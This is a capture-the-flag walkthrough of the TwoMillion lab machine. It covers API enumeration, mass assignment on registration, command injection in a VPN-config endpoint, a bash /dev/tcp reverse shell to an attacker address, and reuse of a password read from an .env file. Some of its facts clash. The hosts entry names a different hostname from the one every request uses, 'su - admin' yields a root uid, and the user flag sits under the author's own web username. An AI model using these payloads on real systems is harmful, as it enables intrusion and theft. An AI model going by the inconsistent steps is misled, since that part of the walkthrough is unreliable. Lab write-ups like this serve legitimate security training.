## Executive Summary

TwoMillion is a retired **Easy** Linux machine whose entire attack surface is an API and the web client that talks to it. The intended lesson is stated in the name: two million invite codes, and the client itself tells you how the codes are generated.

From there, a registration endpoint accepts more fields than the form offers, an administrative endpoint trusts the role it was given, and a feature that builds a VPN configuration file passes a user-controlled value into a shell. Root comes from a credential reused in an environment file.

> [!NOTE]
> Demonstration writeup. Flag values are redacted and some enumeration output is trimmed. Techniques shown are the ones worth learning from, not a transcription of the official solution.

## Introduction

| Item | Value |
| --- | --- |
| Target | `10.10.11.221 twomillion.htb` |
| OS | Ubuntu 22.04 (Linux) |
| Services | 22/tcp SSH, 80/tcp HTTP |
| Difficulty | Easy |
| Focus | API enumeration, mass assignment, command injection |

Add the hostname to `/etc/hosts` before anything else — virtual-host routing will otherwise send you to the wrong content:

```bash
echo "10.10.11.221 twomillion.htb" | sudo tee -a /etc/hosts
```

## Reconnaissance

```bash
nmap -p- --min-rate 2000 -T4 -oN nmap/all-ports.txt 10.10.11.221
nmap -sC -sV -p 22,80 -oN nmap/services.txt 10.10.11.221
```

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://2million.htb/
```

Only two ports. The web application is the engagement.

## Enumeration

### The page is not the application

The landing page offers an invite code and a "join" flow. That is decoration. The interesting part is the JavaScript bundle, because a single-page client has to know every endpoint it calls:

```bash
curl -s http://2million.htb/js/inviteapi.min.js | head -c 1200
```

```javascript
// obfuscated bundle, deobfuscated for clarity
function verifyInviteCode(code) {
  return fetch("/api/v1/invite/verify", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "code=" + code
  });
}
```

One function signature reveals a whole controller: `/api/v1/invite/verify`.

### Mapping the API

```bash
ffuf -u http://2million.htb/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc all -fs 0
```

| Endpoint | Method | Behaviour |
| --- | --- | --- |
| `/api/v1/invite/how/to/generate` | GET | Returns an obfuscated hint |
| `/api/v1/invite/generate` | POST | Returns a base64-wrapped invite code |
| `/api/v1/invite/verify` | POST | Validates a code |
| `/api/v1/user/register` | POST | Creates an account |
| `/api/v1/admin/vpn/generate` | POST | Writes a VPN config for the current user |

The `how/to/generate` endpoint is a hint, not a vulnerability. Decode it twice — once base64, once the rot13 it turns into — and the generation scheme is explicit:

```bash
curl -s http://2million.htb/api/v1/invite/how/to/generate | jq -r .data \
  | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

The server's own generator will hand you a valid code, which is faster than implementing the scheme:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq -r .data.code | base64 -d
```

## Vulnerability Analysis

### Mass assignment on registration

Registration expects four fields. Send five and watch the response:

```http
POST /api/v1/user/register HTTP/1.1
Host: 2million.htb
Content-Type: application/json

{
  "username": "glorison",
  "email": "glorison@local.test",
  "password": "Str0ng!Passphrase",
  "invite_code": "<valid-code>",
  "is_admin": 1
}
```

The account is created with administrative rights. The controller binds the request body onto the user document without allow-listing assignable fields — the classic mass-assignment failure. `is_admin` was never in the form, which is precisely why the server had to reject it.

> [!WARNING]
> Never bind a request body directly to a model. Destructure the fields you accept, validate them, and let everything else be ignored. This one flaw converts a self-service registration into an administrative account.

### Command injection in the VPN generator

With an admin session, `/api/v1/admin/vpn/generate` accepts a `username` value and shells out to build an OpenVPN profile. The endpoint does not restrict the parameter to the authenticated user, and it does not quote it:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b cookies.txt -H "Content-Type: application/json" \
  -d '{"username":"glorison; id"}'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Initial Access

The same parameter takes a reverse shell. URL-encode the payload so the separator and redirects survive:

```bash
# listener on the attacking host
nc -lvnp 9001
```

```text
username=glorison;bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'
```

Stabilise the TTY before doing anything else:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### User flag

```bash
ls -la /home/*/
cat /home/*/user.txt
```

```text
HTB{<redacted_user_flag>}
```

## Privilege Escalation

Start with the things that require no tooling:

```bash
id
sudo -l
ls -la /var/www/html
```

The web root is owned by the application user, and the application's environment file is readable by `www-data`:

```bash
grep -R "DB_\|PASS\|SECRET" /var/www/html/.env
```

```text
DB_PASSWORD=<redacted>
```

That password is reused for the local administrator account. Verify with `su` rather than assuming:

```bash
su - admin
# password from .env
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Credential reuse is not a "trick" answer — it is the most common privilege escalation path in real environments, and it is why secrets in application configuration are treated as root-equivalent when the app runs as a service account.

### Root flag

```bash
cat /root/root.txt
```

```text
HTB{<redacted_root_flag>}
```

## Flags and Proof of Completion

| Flag | Location | Access |
| --- | --- | --- |
| user.txt | `/home/glorison/user.txt` | www-data shell |
| root.txt | `/root/root.txt` | admin credentials |

## Lessons Learned

- **The client is documentation.** Every endpoint the SPA calls is discoverable before you send a single request.
- **Allow-list request fields.** `is_admin` should never be assignable from a public registration form.
- **Quote shell arguments, then stop using the shell.** Use `execFile` with an argument array; the injection class disappears.
- **Secrets are privileges.** A database password in a readable `.env` is a lateral-movement credential.
- **Rate-limit security-relevant endpoints.** An invite system that can be regenerated without limit is not a gate.

## Tools Used

| Tool | Purpose |
| --- | --- |
| nmap | Port and service discovery |
| ffuf | API endpoint discovery |
| curl / jq | Request construction and JSON parsing |
| Burp Suite | Session replay and parameter tampering |
| linpeas | Secondary local enumeration |

## References

- OWASP API Security Top 10 — API3:2023 Broken Object Property Level Authorization
- OWASP WSTG — Testing for Mass Assignment (WSTG-BUSL-04)
- Hack The Box — TwoMillion (retired)
